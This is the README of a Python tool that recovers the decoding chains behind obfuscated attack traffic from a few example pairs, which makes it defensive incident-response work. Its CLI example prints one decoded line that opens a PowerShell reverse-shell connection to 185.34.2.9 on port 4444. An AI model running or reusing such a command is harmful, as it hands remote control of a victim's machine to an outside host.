# deobf — autonomous attack-pipeline discovery

> Pre-production engine built from the research result in the
> [top-level README](../README.md) (paper §6.6, *propose-and-verify* routing). Pure Python
> standard library — **no torch, no model to train.**

**One line.** An analyst supplies 3–5 pairs `(obfuscated_traffic → revealed_payload)` from an
incident. The engine discovers, on its own, the chain of decoders that maps one to the other,
then applies it to unknown traffic.

This is the SOC niche that raw deobfuscation tools miss: not *"decode this base64"* but
*"given a couple of decoded examples, recover the whole obfuscation pipeline of an unseen
campaign — and replay it on everything else you captured."* It works attacker-side too
(reconstruct a target's decoding stack from observed pairs).

## The loop (the four blocks)

```
[DEMOS]    (obfuscated, revealed) × 3–5
   ↓
[PROPOSER] breadth-first, shortest chains first: skill₁ → … → skillₙ
   ↓
[EXECUTOR] apply each candidate chain to the demos (pure byte→byte skills)
   ↓
[CRITIC]   executor(obfuscated) ≈ revealed on every demo? accept : reject
   ↓
[OUTPUT]   the retained pipeline, applied to unknown traffic
```

Skills are **pure, reversible `bytes → bytes` functions** — that purity is what makes chains
composable. The default set (N = 14): `base64`, `base64url`, `base32`, `hex`, `url`, `gunzip`,
`inflate`, `reverse`, `rot13`, `swap_nibbles`, `stream_cbc` (stateful), and the parametric
`xor`, `add`, `substitution`.

## The three problems (handled, in order)

1. **Unknown parameters** (XOR key, S-box table). Terminal parametric steps are *solved* in
   O(1) from `(state, target)` — a XOR key is `state[0] ^ target[0]`, verified constant across
   the demo. Mid-chain parametric candidates are only expanded when a structural decoder then
   validates (XOR/ADD mask structured data), so 255 keys collapse to ~1.
2. **Context-dependent skills** (`stream_cbc`: byte *t* masked by byte *t–1*). Flagged
   `stateful`; the engine composes it like any other pure function but the flag is there for
   the proposer to reason about ordering.
3. **Critic beyond exact match.** `Critic(mode=…)` offers `exact` (default), `token`
   (byte-level accuracy), and `levenshtein` (edit-distance, for recompressed text/bytecode).

## Usage

```python
from deobf import discover, execute_pipeline, format_pipeline, Critic

demos = [(obfuscated_bytes, revealed_bytes), ...]          # 3–5 incident pairs
pipeline = discover(demos, critic=Critic("exact"), max_depth=4)
print(format_pipeline(pipeline))                            # base64 › xor(0x5a)
decoded = execute_pipeline(pipeline, unknown_traffic)       # replay on new captures
```

CLI (incident file → recipe + decoded traffic):

```bash
python -m deobf discover incident.sample.json
#  recipe: base64 › xor(0x5a)
#  unknown[0]: $c=New-Object Net.Sockets.TCPClient('185.34.2.9',4444)
```

## Validation

`python eval_incidents.py` runs five ground-truth incidents (terminal-XOR `solve`, a stateful
CBC stream, and a mid-chain XOR exercising the promising-gate). All five pipelines are
recovered from the demos and the held-out traffic decodes — **total ≈ 1 s, budget 30 s.**

```
Base64+gzip exfil         base64 › gunzip               0.01s  ✓
XOR'd PowerShell loader   base64 › xor(0x5a)            0.01s  ✓
Multi-layer C2 beacon     hex › gunzip › xor(0x3c)      0.02s  ✓
CBC-stream over base32    base32 › stream_cbc           0.01s  ✓
Base64 over XOR'd gzip    base64 › xor(0x42) › gunzip   1.04s  ✓
```

Tests: `python -m pytest tests/ -q` (9 passing).

## Scope & roadmap (what is deliberately *not* here yet)

- The proposer is exhaustive BFS — correct and fast for N ≤ 15 skills, depth ≤ 4. An
  **LLM-guided proposer** (next-skill from state + demos) replaces it when N > 10 or depth > 3.
- The critic is exact/edit-distance. A **learned "is-this-revealed?" judge** (entropy drop,
  printable ratio, YARA/IOC match, or the neural B-MoE critic) comes after the BFS loop is
  proven on real malware pairs.
- No UI and no source-code generalization yet — binary/network first, on real ground truth.
